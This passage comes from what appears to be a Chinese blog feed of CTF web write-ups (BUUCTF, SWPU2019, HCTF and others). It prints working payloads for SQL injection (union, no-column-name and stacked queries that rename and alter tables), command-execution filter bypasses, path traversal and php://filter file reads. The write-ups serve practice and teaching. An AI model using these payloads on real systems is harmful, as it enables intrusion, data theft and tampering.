&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $get_flag &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;str_ireplace&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;cat&amp;#34;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#34;wctf2020&amp;#34;&lt;/span&gt;, $get_flag);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&amp;lt;/br&amp;gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;system&lt;/span&gt;($get_flag);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }&lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;快到非洲了&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}&lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;去非洲吧&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;?&amp;gt;&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;一关一关的&lt;strong&gt;bypass&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;第一关&lt;/p&gt;
&lt;p&gt;重点在&lt;code&gt;intval&lt;/code&gt;函数，intval函数有个特性:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;直到遇上数字或正负符号才开始做转换，再遇到非数字或字符串结束时(\0)结束转换&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;这里需要num的值小于2020，加一后值大于2021，可以使用科学计数法方法绕过。构造payload&lt;code&gt;2e9&lt;/code&gt;，遇到第一个函数转换时，因为是以2开头下一位是字符，会直接被截取为2；遇到第二个函数，因为使用了&lt;code&gt;$num + 1&lt;/code&gt;会进行类型转换，2e9会先使用科学计数法计算出值并+1。&lt;/p&gt;
&lt;p&gt;第二关&lt;/p&gt;
&lt;p&gt;需要一个md5值，对这个值再次使用md5加密以后，使用&lt;strong&gt;弱类型&lt;/strong&gt;比较，和原来的值相同。md5的一个弱类型比较绕过：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;PHP在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0E”开头的，那么PHP将会认为他们相同，都是0。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;使用脚本跑一下得到一个值：&lt;code&gt;0e215962017&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;最后一层，是一个&lt;code&gt;system&lt;/code&gt;函数执行，但是在之前有一些过滤&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;strstr&lt;/code&gt;函数匹配空格，可以使用${IFS}绕过（这个里面有更详细的：&lt;a class="link" href="https://www.ghtwf01.cn/index.php/archives/273/" target="_blank" rel="noopener"
&gt;命令执行漏洞利用及绕过方式总结&lt;/a&gt;）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;str_ireplace&lt;/code&gt;会吧cat替换成wctf2020，所以不能使用cat命令，可以用：more、less、od、tail等等绕过，上面的博客里也有写道。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;先使用ls查看下当前目录下的文件，发现一个名为&lt;code&gt;fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag&lt;/code&gt;读取得到flag。&lt;/p&gt;
&lt;p&gt;最终payload：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-url" data-lang="url"&gt;/fl4g.php?num=2e9&amp;amp;md5=0e215962017&amp;amp;get_flag=more${IFS}fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag
&lt;/code&gt;&lt;/pre&gt;</description></item><item><title>SWPU2019 Web1</title><link>https://www.braindance.top/posts/ctf/swpu2019web1/</link><pubDate>Thu, 15 Apr 2021 09:55:17 +0000</pubDate><guid>https://www.braindance.top/posts/ctf/swpu2019web1/</guid><description>&lt;p&gt;一个登陆界面，再看下url地址为login.php，确认了使用的是php&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210415091617.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;直接查看源码，在源码中找到了register.php。先注册一个进去看一看。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210415091705.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;是一个发布广告的信息页，发布广告时需要输入广告的标题和内容，联想一下之前做过的发布文章的，应该是sql注入，输入广告标题输入一个单引号&lt;code&gt;'&lt;/code&gt;试一试&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210415091924.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;广告详情中出现了数据库报错&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210415091959.png"
loading="lazy"
&gt;猜测应该是二次注入，发布时加上一些转义字符没有出现错误，但是查看详情时再次从数据库中取出带有payload的数据，可以执行sql语句。而且上面的单引号测试出来了是&lt;strong&gt;字符型单引号闭合&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;接下来是尝试过滤。我试出来的有空格（使用&lt;code&gt;/**/&lt;/code&gt;绕过）、or，and（可以使用&amp;amp;&amp;amp;，||），同时or被过滤，就说明保存数据库表名的库&lt;strong&gt;information_schema&lt;/strong&gt;没有办法查询，并且&lt;strong&gt;orderby&lt;/strong&gt;也不能使用，需要使用其他办法获取表内容。&lt;/p&gt;
&lt;p&gt;测试一下当前表的字段数，从1开始加，一直会报字段数不匹配，直到尝试到22。还需要主义的是执行的sql语句后面的 &lt;code&gt;LIMIT 0,1&lt;/code&gt;需要闭合，所以最后添加了一个单引号&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210415092716.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;说明回显位是2和3。&lt;/p&gt;
&lt;p&gt;由于没有办法查询表名，所以需要我们自己猜测，CTF比赛中常见的表名就是flag、users、举办方的缩写啥的。&lt;del&gt;这种没有办法查询表名的题目表名应该都不会设置太难&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;测试的语句&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;/**/union/**/select/**/1,(select/**/*/**/from/**/flag),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;当测到&lt;code&gt;users&lt;/code&gt;表时返回了当前字段数不匹配的错误，说名users里有多个字段，肯定没有办法显示在一列中。所以接下来是猜users表的字段数。&lt;/p&gt;
&lt;p&gt;首先讲解一波&lt;strong&gt;无列名注入&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;先来个正常表（flag）的查询&lt;/p&gt;
&lt;p&gt;&lt;img src="D:%5cDROPS%5cCTF%e6%af%94%e8%b5%9b%e9%a2%98%e8%a7%a3%5cBUUCTF%5cWeb%5c[SWPU2019]Web1%5c20210415094632.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;我们知道在sql语句查询的时候，可以给列名起别名形如&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210415094059.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;使用联合查询的时候，只要前后表的字段数相同，前面查询的就会成为表名&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210415094238.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;所以当我们不知道flag表的字段，并且想要查询里面的内容时，比如我想查询flag表的flag字段，可以构造&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210415094814.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;需要为子查询的结果再起一个别名（图中为&lt;code&gt;x&lt;/code&gt;），这样我们就不用列名查询到了字段。总结一下思路就是：自己构造一个表名并且联合查询想要查询的表名，再使用&lt;code&gt;group_concat&lt;/code&gt;函数输出自己构造的表名。&lt;/p&gt;
&lt;p&gt;所以测试users表的字段数时，就通过形如上图的格式，改变联合查询的字段数判断。&lt;/p&gt;
&lt;p&gt;最终的payload：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description></item><item><title>BUUCTF寒假刷题-Web</title><link>https://www.braindance.top/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/</link><pubDate>Mon, 18 Jan 2021 16:58:56 +0000</pubDate><guid>https://www.braindance.top/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/</guid><description>&lt;p&gt;寒假横向刷题（尽量）
&lt;a class="link" href="https://buuoj.cn/challenges#" target="_blank" rel="noopener"
&gt;BUUCTF&lt;/a&gt;
💗🧡💛💚💙💜🤎🖤🤍
&lt;strong&gt;题都写这一个里面了，可以先用&lt;code&gt;Ctrl+F&lt;/code&gt;搜索，还有部分是草稿还没有整理，不过我认为的思路已经整理出来了，看不懂还请大伙见谅。有问题了很乐意效劳💨&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id="20210115"&gt;2021.01.15
&lt;/h1&gt;&lt;h1 id="hctf-2018warmup"&gt;[HCTF 2018]WarmUp
&lt;/h1&gt;&lt;p&gt;进到靶机一个硕大的滑稽，查看源码有提示source.php&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120101413.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
highlight_file(__FILE__);
class emmm
{
public static function checkFile(&amp;amp;$page)
{
$whitelist = [&amp;#34;source&amp;#34;=&amp;gt;&amp;#34;source.php&amp;#34;,&amp;#34;hint&amp;#34;=&amp;gt;&amp;#34;hint.php&amp;#34;];
if (! isset($page) || !is_string($page)) {
echo &amp;#34;you can&amp;#39;t see it&amp;#34;;
return false;
}
if (in_array($page, $whitelist)) {
return true;
}
$_page = mb_substr(
$page,
0,
mb_strpos($page . &amp;#39;?&amp;#39;, &amp;#39;?&amp;#39;)
);
if (in_array($_page, $whitelist)) {
return true;
}
$_page = urldecode($page);
$_page = mb_substr(
$_page,
0,
mb_strpos($_page . &amp;#39;?&amp;#39;, &amp;#39;?&amp;#39;)
);
if (in_array($_page, $whitelist)) {
return true;
}
echo &amp;#34;you can&amp;#39;t see it&amp;#34;;
return false;
}
}
if (! empty($_REQUEST[&amp;#39;file&amp;#39;])
&amp;amp;&amp;amp; is_string($_REQUEST[&amp;#39;file&amp;#39;])
&amp;amp;&amp;amp; emmm::checkFile($_REQUEST[&amp;#39;file&amp;#39;])
) {
include $_REQUEST[&amp;#39;file&amp;#39;];
exit;
} else {
echo &amp;#34;&amp;lt;br&amp;gt;&amp;lt;img src=\&amp;#34;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&amp;#34; /&amp;gt;&amp;#34;;
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;发现白名单有source.php和hint.php，先去查看一下hint.php&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;flag not here, and flag in ffffllllaaaagggg&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;分析源码&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;判断&lt;code&gt;$_REQUEST['file']&lt;/code&gt;对象为空且为字符串&lt;/li&gt;
&lt;li&gt;执行emmm类中的&lt;strong&gt;checkFile&lt;/strong&gt;方法判断是否在白名单（确保函数返回是true）&lt;/li&gt;
&lt;li&gt;文件包含&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;checkFile函数中字符串截取判断是否在白名单（代码17-24和26-34）所以有两种绕过方法。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;第一种&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;file=hint.php?../../../../../ffffllllaaaagggg
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;字符串截取将原字符串尾部加上&lt;code&gt;?&lt;/code&gt;再截取第一个&lt;code&gt;?&lt;/code&gt;之前的内容。所以需要在构造payload时问号前需要是白名单里的文件。问号之后，猜测flag位置在根目录下，所以使用尽可能多的&lt;code&gt;../&lt;/code&gt;返回上级目录。&lt;/p&gt;
&lt;ol start="2"&gt;
&lt;li&gt;第二种&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;hint.php%3F..%2F..%2F..%2F..%2F..%2Fffffllllaaaagggg
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;将第一种payload使用urlencode编码即可。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="强网杯-2019随便注"&gt;[强网杯 2019]随便注
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120094248.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;根据题目尝试sql注入，单引号报错，单引号加注释无报错，说明存在sql注入，当测试输入select时返回过滤的黑名单：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;return preg_match(&amp;#34;/select|update|delete|drop|insert|where|\./i&amp;#34;,$inject);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这道题使用的是堆叠注入，原理&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;查看数据库&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39;;show databases;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120095211.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;查看当前库下的表&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39;;show tables;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120095339.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;查看两张表字段&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39;;show columns from words;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120095607.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;还有一种查看表的语句，在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39;;desc `1919810931114514`;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120095839.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;找到了flag在的字段，接下来就是如何获取该字段的值。顺带一提，根据表的结构，初步判断默认查询的是&lt;strong&gt;word&lt;/strong&gt;表中的字段，而flag在&lt;strong&gt;1919810931114514&lt;/strong&gt;表中。&lt;/p&gt;
&lt;p&gt;网上找到的两种方法，分别是修改表名和使用预处理语句。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;使用&lt;a class="link" href="https://www.cnblogs.com/geaozhang/p/9891338.html" target="_blank" rel="noopener"
&gt;预处理&lt;/a&gt;语句&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;因为select被过滤了，但是可以使用char函数，char() 函数将select的ASCII码转换为select字符串，接着利用concat()函数进行拼接得到select查询语句，从而绕过过滤。或者直接用concat()函数拼接select来绕过。&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;char(115,101,108,101,99,116)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;根据预处理语句格式构造payload&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;创建一个&lt;strong&gt;sqli&lt;/strong&gt;字符串值为查询sql语句，使用预处理语句赋值并执行。&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39;;SET @sqli=concat(char(115,101,108,101,99,116),&amp;#39;* from `1919810931114514`&amp;#39;);PREPARE hacker from @sqli;EXECUTE hacker;#
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;不使用变量&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39;;PREPARE sqli FROM CONCAT(&amp;#39;s&amp;#39;,&amp;#39;elect&amp;#39;,&amp;#39; * from `1919810931114514`&amp;#39;);EXECUTE sqli; #
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;还有一种&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39;;SET @sqli = CONCAT(&amp;#39;s&amp;#39;,&amp;#39;e&amp;#39;,&amp;#39;l&amp;#39;,&amp;#39;e&amp;#39;,&amp;#39;c&amp;#39;,&amp;#39;t&amp;#39;,&amp;#39; * from `1919810931114514`&amp;#39;);PREPARE haha FROM@sqli ;EXECUTE haha; #
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;主要区别在于过滤的绕过方式，不要拘泥于一种方式。&lt;/p&gt;
&lt;ol start="2"&gt;
&lt;li&gt;修改表名&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;修改表名的思路是：默认查询的是&lt;strong&gt;word&lt;/strong&gt;表第一个字段，所以把&lt;strong&gt;word&lt;/strong&gt;表修改为其他名称，将flag所在的&lt;strong&gt;1919810931114514&lt;/strong&gt;表名修改为&lt;strong&gt;word&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;网上payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;0&amp;#39;;rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc words;#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;自己构造的payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;0&amp;#39;;rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) #
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;之后执行&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39; or 1=1 #
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查询表所有字段值即可。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="极客大挑战-2019easysql"&gt;[极客大挑战 2019]EasySQL
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120101528.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;用户名密码，尝试万能密码。&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;#39;or 1=1 #
随便密码
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;一个万能密码的参考:https://www.cnblogs.com/pass-A/p/11134988.html&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="极客大挑战-2019havefun"&gt;[极客大挑战 2019]Havefun
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120101733.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;直接源码找到php代码。payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?cat=dog
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="suctf-2019easysql"&gt;[SUCTF 2019]EasySQL
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120102317.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;单引号无报错，尝试堆叠注入可以回显。&lt;/p&gt;
&lt;p&gt;和 [强网杯 2019]随便注这道题一样查库查表查字段&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1;show databases;
1;show tables;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;但是执行&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1;desc `Flag`;
1;show columns from Flag;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;返回了&amp;quot;Nonono.“测试出被过滤了：desc、from、Flag。&lt;/p&gt;
&lt;p&gt;接下来的都是抄网上的预期解也是第一次见。&lt;/p&gt;
&lt;p&gt;比赛时源码泄露&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;select $_GET[&amp;#39;query&amp;#39;] || flag from flag
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 缺省不支持。需要调整mysql 的sql_mode
模式：pipes_as_concat 来实现oracle 的一些功能&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1;set sql_mode=PIPES_AS_CONCAT;select 1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;非预期解&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;*,1
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="actf2020-新生赛include"&gt;[ACTF2020 新生赛]Include
&lt;/h1&gt;&lt;p&gt;不截图了，进入靶机只有一个&lt;strong&gt;tips&lt;/strong&gt;等着被点。跳转以后看url中参数&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?file=flag.php
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;页面内容只有&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Can you find out the flag?&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;立马想到使用php伪协议读文件内容。使用filter过滤器&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?file=php://filter/convert.base64-encode/resource=flag.php
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;得到&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7OTAyNTIyNDgtMjY3NC00NDdjLWFlYWMtYjc3ZTc5YjYwMzVmfQo=
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;解密得到flag&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="极客大挑战-2019secret-file"&gt;[极客大挑战 2019]Secret File
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120103724.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;查看源码，又一个背景是黑色的超链接跳转到 Archive_room.php。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120103842.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;查看源码SECRET跳转的是action.php。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120103907.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;但是跳转以后是url地址为end.php，所以中间跳过了一个页面，使用bp抓包查看。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120104246.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;stristr()函数返回字符串中子串第一次出现位置之后的内容，简而言之还是过滤。&lt;/p&gt;
&lt;p&gt;同样使用php伪协议filter过滤器读取文件&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?file=php://filter/convert.base64-encode/resource=flag.php
&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex="0"&gt;&lt;code&gt;PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7ZmZjZTAwNWYtYjEyOS00YWM1LTg3MzYtZDM3YzUwYjYxNjZkfSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;解密得到网页源码，flag在其中。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="极客大挑战-2019lovesql"&gt;[极客大挑战 2019]LoveSQL
&lt;/h1&gt;&lt;p&gt;顶端の告诫：用 sqlmap 是没有灵魂的&lt;/p&gt;
